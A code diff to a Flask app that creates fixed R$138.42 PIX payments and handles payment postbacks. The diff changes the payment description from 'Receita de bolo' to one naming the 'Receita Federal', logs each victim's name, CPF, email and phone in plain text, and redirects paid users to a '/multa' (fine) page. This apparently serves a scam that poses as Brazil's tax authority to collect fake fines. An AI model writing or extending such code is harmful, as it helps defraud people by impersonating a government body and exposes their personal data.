@@ -550,21 +550,21 @@ def generate_pix():
         # Dados do usuário para a transação PIX
         user_name = customer_data['nome']
         user_cpf = customer_data['cpf'].replace('.', '').replace('-', '')  # Remove formatação
-        amount = 138.42  # Valor fixo de R$ 138,42
+        ticket_amount = 138.42  # Valor do ticket: R$ 138,42
 
-        app.logger.info(f"[PROD] Dados do usuário: Nome={user_name}, CPF={user_cpf}, Email={default_email}, Telefone={user_phone}")
+        app.logger.info(f"[PROD] Ticket R$ {ticket_amount:.2f} - Nome={user_name}, CPF={user_cpf}, Email={default_email}, Telefone={user_phone}")
 
         # Criar nova transação MEDIUS PAG para obter PIX real
-        app.logger.info(f"[PROD] Criando transação MEDIUS PAG real para {user_name}")
+        app.logger.info(f"[PROD] Criando ticket PIX R$ {ticket_amount:.2f} para {user_name}")
         
         try:
             transaction_data = {
-                'amount': amount,
+                'amount': ticket_amount,
                 'customer_name': user_name,
                 'customer_cpf': user_cpf,
                 'customer_email': default_email,
                 'customer_phone': user_phone,
-                'description': 'Receita de bolo'
+                'description': f'Ticket R$ {ticket_amount:.2f} - Receita Federal'
             }
             
             # Criar transação real na MEDIUS PAG
@@ -572,11 +572,11 @@ def generate_pix():
             
             if pix_data.get('success', False) and pix_data.get('transaction_id'):
                 real_transaction_id = pix_data['transaction_id']
-                app.logger.info(f"[PROD] ✅ Transação MEDIUS PAG criada: {real_transaction_id}")
+                app.logger.info(f"[PROD] ✅ Ticket PIX R$ {ticket_amount:.2f} criado: {real_transaction_id}")
                 
                 # Verificar se já temos PIX code real da MEDIUS PAG
                 if pix_data.get('pix_code'):
-                    app.logger.info(f"[PROD] ✅ PIX real da MEDIUS PAG obtido: {pix_data['pix_code'][:50]}...")
+                    app.logger.info(f"[PROD] ✅ Código PIX do ticket R$ {ticket_amount:.2f} obtido: {pix_data['pix_code'][:50]}...")
                     
                     # Se não temos QR code, gerar a partir do PIX code real
                     if not pix_data.get('qr_code_image'):
@@ -733,9 +733,9 @@ def medius_postback():
             
             app.logger.info(f"[POSTBACK] 📊 Status: {transaction_status}, Amount: {transaction_amount}, ID: {transaction_id}")
             
-            # Se o pagamento foi realizado e é de R$138,42 (13842 centavos)
+            # Se o ticket foi pago e é de R$138,42 (13842 centavos)
             if transaction_status == 'paid' and transaction_amount == 13842:
-                app.logger.info(f"[POSTBACK] 🎉 PAGAMENTO DE R$138,42 CONFIRMADO! Amount: {transaction_amount} centavos, ID: {transaction_id}")
+                app.logger.info(f"[POSTBACK] 🎫 TICKET R$138,42 PAGO - CONFIRMADO! Amount: {transaction_amount} centavos, ID: {transaction_id}")
                 app.logger.info(f"[POSTBACK] ✅ REDIRECIONAMENTO PARA /MULTA AUTORIZADO!")
                 
                 # Marcar transação como paga para verificação posterior
@@ -748,7 +748,7 @@ def medius_postback():
                     'redirect_to_multa': True
                 }), 200
             else:
-                app.logger.info(f"[POSTBACK] ⏳ Pagamento de valor diferente ou status não pago: {transaction_amount} centavos, status: {transaction_status}")
+                app.logger.info(f"[POSTBACK] ⏳ Ticket de valor diferente ou status não pago: {transaction_amount} centavos, status: {transaction_status}")
         else:
             app.logger.warning(f"[POSTBACK] ⚠️ Nenhum dado recebido no postback")
                 
